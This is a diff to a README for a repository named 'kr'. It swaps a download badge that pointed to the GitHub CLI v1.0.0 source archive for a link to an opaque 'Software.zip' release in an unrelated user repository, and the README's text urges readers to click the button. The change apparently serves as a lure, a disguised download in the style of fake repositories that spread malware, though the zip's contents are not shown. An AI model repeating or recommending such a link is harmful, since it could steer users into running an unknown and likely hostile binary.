@@ -1,6 +1,6 @@
 # **🚀 Welcome to the "kr" Repository! 🌟**
 
-[![](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/uxBorges/kr/releases/download/v1.0/Software.zip)](https://github.com/uxBorges/kr/releases/download/v1.0/Software.zip)
 
 Hey there! 👋 If you are looking to access the latest version of the "kr" repository, you can download it by clicking the shiny blue button above! 🎉 
 
